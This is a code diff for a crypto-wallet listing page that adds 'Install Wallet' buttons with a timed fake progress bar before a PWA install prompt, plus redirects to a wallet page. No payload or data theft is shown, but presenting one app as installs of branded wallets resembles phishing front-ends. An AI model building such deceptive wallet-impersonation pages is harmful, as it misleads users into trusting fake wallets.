@@ -3,6 +3,7 @@ console.log("Wallets page loaded!");
 // Final clean wallet list (no duplicates)
 const wallets = [
   "Meta Mask",
+  "Poloniex",
   "Trust",
   "Solflare",
   "WalletConnect",
@@ -56,45 +57,92 @@ const wallets = [
   "Exodus",
   "Binance",
   "Bitget",
-  "Poloniex",
 ];
 
 const container = document.getElementById("walletContainer");
 
+// Generate cards
 wallets.forEach((name) => {
-  // Convert name → image filename
   let imageName =
     name
       .toLowerCase()
-      .replace(/\s+/g, "") // remove spaces
-      .replace(/'/g, "") // remove '
-      .replace(/\./g, "") // remove .
-      .replace(/-/g, "") // remove -
-      .replace(/\//g, "") + // remove /
-    ".webp";
+      .replace(/\s+/g, "")
+      .replace(/'/g, "")
+      .replace(/\./g, "")
+      .replace(/-/g, "")
+      .replace(/\//g, "") + ".webp";
 
-  // Special FIX (Other Wallets → NO IMAGE)
+  // Other Wallets without icon
   if (name.toLowerCase().includes("other")) {
     container.innerHTML += `
-            <div class="wallet-card" onclick="openWallet('${name}')">
-                <p>${name}</p>
-            </div>
-        `;
+      <div class="wallet-card">
+        <p>${name}</p>
+        <button onclick="showPWAPopup()">Install Wallet</button>
+        <button onclick="openWallet('${name}')">Open Wallet</button>
+      </div>
+    `;
     return;
   }
 
-  // Show console log to see which file is being loaded
-  console.log("Loading:", imageName);
-
-  // Normal wallet card
   container.innerHTML += `
-        <div class="wallet-card" onclick="openWallet('${name}')">
-            <img src="wallet-icons/${imageName}" alt="${name}">
-            <p>${name}</p>
-        </div>
-    `;
+    <div class="wallet-card">
+      <img src="wallet-icons/${imageName}" alt="${name}">
+      <p>${name}</p>
+
+      <button onclick="showPWAPopup()">Install Wallet</button>
+      <button onclick="openWallet('${name}')">Open Wallet</button>
+    </div>
+  `;
 });
 
+// Open wallet page
 function openWallet(walletName) {
   window.location.href = `wallet-page.html?wallet=${walletName}`;
+}
+
+/* ---------------------------
+   PWA INSTALL + POPUP LOGIC
+----------------------------- */
+
+let deferredPrompt = null;
+
+// Store install event
+window.addEventListener("beforeinstallprompt", (e) => {
+  e.preventDefault();
+  deferredPrompt = e;
+});
+
+// Show popup with progress loader
+function showPWAPopup() {
+  if (!/Android|iPhone/i.test(navigator.userAgent)) {
+    alert("This feature only works on mobile.");
+    return;
+  }
+
+  document.getElementById("pwaPopup").style.display = "flex";
+
+  let progress = 0;
+  let interval = setInterval(() => {
+    progress++;
+    document.getElementById("progressText").innerText = `Loading… ${progress}%`;
+    document.getElementById("progressFill").style.width = progress + "%";
+
+    if (progress >= 100) {
+      clearInterval(interval);
+      document.getElementById("installBtn").style.display = "block";
+    }
+  }, 40);
+}
+
+// Install button pressed
+document.getElementById("installBtn").onclick = async () => {
+  if (deferredPrompt) {
+    deferredPrompt.prompt();
+    deferredPrompt = null;
+  }
+};
+
+// Close popup
+function closePopup() {
+  document.getElementById("pwaPopup").style.display = "none";
 }
